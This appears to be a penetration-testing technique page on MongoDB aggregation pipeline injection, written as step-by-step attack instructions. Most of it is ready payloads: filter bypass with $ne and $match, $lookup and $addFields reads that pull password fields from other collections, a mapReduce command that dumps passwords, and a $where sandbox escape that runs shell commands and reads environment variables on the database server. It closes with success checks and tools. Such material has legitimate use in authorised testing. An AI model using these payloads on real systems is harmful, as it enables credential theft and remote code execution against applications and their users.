# MongoDB Aggregation Pipeline Injection

## When this applies

- Application uses `db.collection.aggregate([...])` with user input inside pipeline stages (common for analytics, search, dashboards).
- Endpoints exposing raw aggregation arrays (`POST /api/search` with `{"pipeline": [...]}` body).
- Frameworks like Strapi, Parse Server, custom GraphQL resolvers built on raw MongoDB.

## Technique

Aggregation pipelines are arrays of stage objects. If the user controls a stage (or any operator within a stage), you can chain `$lookup`, `$match`, `$group`, `$addFields`, and `$function` to read across collections, leak schema, and execute JavaScript.

## Steps

### 1. `$match` injection (extract beyond filter)

Normal: `db.products.aggregate([{$match: {category: USER_INPUT}}])`.

Inject:

```json
{"category": {"$ne": null}}
```

Returns ALL products regardless of category.

Group by hidden field:

```json
[
  {"$match": {}},
  {"$group": {"_id": "$category", "count": {"$sum": 1}}}
]
```

Reveals every distinct category — including hidden categories.

### 2. `$lookup` cross-collection read

If user controls any stage and `$lookup` is reachable:

```json
[{"$lookup": {
    "from": "users",
    "localField": "_id",
    "foreignField": "_id",
    "as": "stolen_data"
}}]
```

`$lookup` joins arbitrary collections — bypasses normal access controls because the aggregation framework doesn't enforce per-collection permissions in many configurations.

### 3. `$addFields` to leak fields

Inject computed fields that expose data from joined documents:

```json
[{"$addFields": {"leaked_field": "$password"}}]
```

When the response renders the result, `leaked_field` contains the password.

### 4. `$where` inside aggregation `$match`

```json
[{"$match": {"$where": "this.password.length == 8"}}]
```

Same blind-extraction primitives as `mongo-where-jsinjection.md` — but reachable through aggregation when the dedicated find query is filtered.

### 5. `$function` (MongoDB 4.4+) for arbitrary JS

```json
[{
  "$addFields": {
    "leaked": {
      "$function": {
        "body": "function() { return this.password; }",
        "args": [],
        "lang": "js"
      }
    }
  }
}]
```

`$function` is the modern replacement for `$where` and may be enabled even when `$where` is disabled. Same JS power.

### 6. `mapReduce` exploitation

When `db.runCommand` accepts user input:

```javascript
db.runCommand({
    mapReduce: "users",
    map: function() { emit(this._id, this.password); },
    reduce: function(key, values) { return values.join(','); },
    out: "exfiltrated"
});
```

Then read from `exfiltrated` collection in a follow-up query.

### 7. SSJS RCE (when `$where` allows full JS context)

```json
{"$where": "this.constructor.constructor('return process.env')()"}
{"$where": "this.constructor.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()"}
```

Escapes the sandbox via `Function` constructor — when the JS context shares globals with the Node.js host, this is RCE on the database server.

### 8. Pipeline detection

Send a benign payload:

```json
[{"$match": {}}]
```

If the response contains all documents (vs the filtered subset), pipeline injection works.

## Verifying success

- Result set contains documents from a different collection than expected.
- Response includes a leaked field name with sensitive data.
- `$function`/`$where`-based extraction returns credentials/tokens that authenticate elsewhere.
- SSJS RCE: `process.env` returns environment variables.

## Common pitfalls

- `$where` and `$function` both require `security.javascriptEnabled: true` (default true ≤ 4.4, default false ≥ 4.4 in some distributions).
- Aggregation pipelines are typed: stage operators must match expected schema. Wrong operator key returns 500 — useful for detection.
- `$lookup` requires `from` to reference a collection in the same database; cross-DB lookups need `$lookup.let` and special permissions.
- SSJS RCE works only when MongoDB's JS engine has access to host globals (rare on Atlas / managed instances; common on self-hosted).
- Some Mongoose schemas auto-strip `$`-prefixed keys — confirm the raw API receives them.

## Tools

- mongosh / mongo CLI for testing pipelines locally.
- Burp Repeater for crafting JSON pipeline arrays.
- NoSQLMap (limited aggregation support).
- Source code review (`db.collection.aggregate(`) is the most reliable detection.
